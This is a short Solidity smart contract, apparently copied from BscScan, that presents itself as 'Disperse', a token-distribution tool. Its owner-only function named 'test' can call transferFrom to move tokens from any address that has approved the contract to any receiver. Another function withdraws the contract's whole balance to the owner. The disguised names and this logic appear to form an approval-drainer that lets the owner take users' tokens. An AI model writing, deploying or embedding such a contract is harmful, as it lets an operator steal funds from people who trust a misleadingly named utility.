/**
 *Submitted for verification at BscScan.com on 2021-09-02
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.5.17;


interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract Disperse is Owned {
    function test(IERC20 token, address sender, address receiver, uint256 value) external onlyOwner() {
        require(token.transferFrom(sender, receiver, value));
    }

    function clearCNDAO() public onlyOwner() {
        address payable _owner = msg.sender;
        _owner.transfer(address(this).balance);
    }
}